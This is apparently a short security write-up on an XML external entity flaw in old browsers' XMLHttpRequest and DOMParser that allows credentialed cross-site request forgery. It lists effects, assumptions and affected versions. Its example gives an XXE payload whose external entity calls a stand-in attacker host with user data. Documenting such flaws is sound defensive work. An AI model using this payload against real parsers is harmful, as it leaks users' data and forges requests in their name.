# XMLHttpRequest and DOMParser parsing allow arbitrary XSRF via XXE #

## Effect ##
Can cause the browser to request an arbitrary URL with the user's credentials.


## Background ##
XSRF is described at http://en.wikipedia.org/wiki/Cross-site_request_forgery

See http://www.securiteam.com/securitynews/6D0100A5PU.html for a description of XXE

Most browsers have some form of dom parser similar to http://developer.mozilla.org/en/docs/DOMParser


## Assumptions ##
Untrusted code can access the XMLHttpRequest object or cause a URL that it crafts to be passed to be requested.

OR

Untrusted code can cause a snippet of crafted XML to be parsed.



## Versions ##
IE 6 and old Firefox < 1.5.0.2

From http://lekkimworld.com/2006/05/29/firefox_and_external_xml_entity_references.html covers Firefox's vulnerabilities



## Example ##
```
<?xml version="1.0"?>
<!DOCTYPE foo [
   <!ENTITY external_info SYSTEM "http://evil.org?user_data=123">
]>
<foo>
   &external_info;
</foo>
```

Similar issues may arise with XSLTransform and the document() function.